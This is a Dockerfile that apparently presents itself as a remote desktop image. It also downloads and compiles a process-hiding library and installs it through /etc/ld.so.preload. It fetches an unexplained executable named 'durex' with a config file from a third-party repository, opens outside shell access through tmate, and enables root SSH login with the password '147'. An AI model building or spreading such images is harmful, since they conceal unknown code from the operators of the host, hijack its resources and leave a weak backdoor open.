FROM debian
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt upgrade -y && apt install -y \
    ssh git wget nano curl python3 python3-pip tmate \
    xvfb xserver-xorg-video-dummy policykit-1 xbase-clients \
    python3-packaging python3-psutil python3-xdg \
    libcairo2 libdrm2 libgbm1 libglib2.0-0 libgtk-3-0 \
    libnspr4 libnss3 libpango-1.0-0 libutempter0 \
    libxdamage1 libxfixes3 libxkbcommon0 libxrandr2 libxtst6 sudo

RUN wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
RUN dpkg -i chrome-remote-desktop_current_amd64.deb
RUN apt-get install --assume-yes --fix-broken
RUN bash -c 'echo \"exec /etc/X11/Xsession /usr/bin/xfce4-session\" > /etc/chrome-remote-desktop-session'
RUN apt remove --assume-yes gnome-terminal
RUN apt install --assume-yes xscreensaver
RUN systemctl disable lightdm.service

RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
&& gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
&& mv libprocess.so /usr/local/lib/ \
&& echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload   
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
&& wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
&& chmod +x durex
RUN mkdir /run/sshd \
    && echo "sleep 5" >> /openssh.sh \
    && echo "sleep 5" >> /openssh.sh \
    && echo "tmate -F &" >>/openssh.sh \
    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
    && echo root:147|chpasswd \
    && chmod 755 /openssh.sh
EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000
CMD /openssh.sh
